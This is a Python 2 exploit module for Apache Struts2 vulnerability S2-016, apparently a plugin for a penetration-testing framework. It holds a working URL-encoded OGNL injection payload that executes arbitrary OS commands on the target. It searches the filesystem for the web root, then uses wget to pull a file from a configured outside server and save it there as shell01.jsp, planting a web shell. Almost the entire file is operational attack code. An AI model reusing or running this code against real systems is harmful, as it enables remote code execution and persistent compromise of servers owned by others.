# coding:utf-8
import sys
import re
from EXP.exp_template import Exploit, Level, session

from conf import config
"""
构造函数需要传递以下参数
url   测试目标的url
exp需要实现的方法为meta_info和exploit
create by swm  2018/07/05
done:
获取webpath
只能使用wget下载文件
"""


class S2016(Exploit):

    def meta_info(self):
        return {
            'name': 'S2-016',
            'author': 'swm',
            'date': '2018/07/05'
        }

    def executecmd(self, command):
        poc = "/default.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution" \
              "%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStati" \
              "cMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%2" \
              "9%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%2" \
              "7{}%27%29.getInputStream%28%29%29%7D".format(command)
        commandurl = self.url + poc
        s = session()
        try:
            r = s.get(commandurl, timeout=5)
            resp = r.text.encode("utf-8")
            return resp
        except:
            return False

    # 获取web文件的路径
    def getwebpath(self):
        cmd = 'find / -name *.jsp'
        # </b> /usr/local/tomcat/webapps/ROOT/
        re_webpath = re.compile(r'(\/\w+)+\/webapps\/\w+\/')
        str = self.executecmd(cmd)
        webpath = re_webpath.search(str)
        if webpath:
            self.report('webpath:{}'.format(webpath.group()), Level.info)
            return webpath.group()
        else:
            self.report('Canot find webpath', Level.error)
            return False

    def wgetfile(self, serverurl, filepath):
        cmd = ''' wget {} -O {}shell01.jsp'''.format(serverurl, filepath)
        response = self.executecmd(cmd)
        return response

    def exploit(self):
        if self.url == '' or (not self.url.startswith('http://') and not self.url.startswith('https://')):
            self.report('url error', Level.error)
            return
        # 获取webapp的根目录
        webpath = self.getwebpath()
        if webpath:
            self.wgetfile(config['serverurl'], webpath)
            return True
        else:
            return False


if __name__ == '__main__':
    url = "http://localhost:8089/default.action"
    s = S2016(url)
    res = s.exploit()
    print res
    # if len(sys.argv) == 2:
    #     s = S2DEVMODE(sys.argv[1])
    #     res = s.exploit()
    #     print res
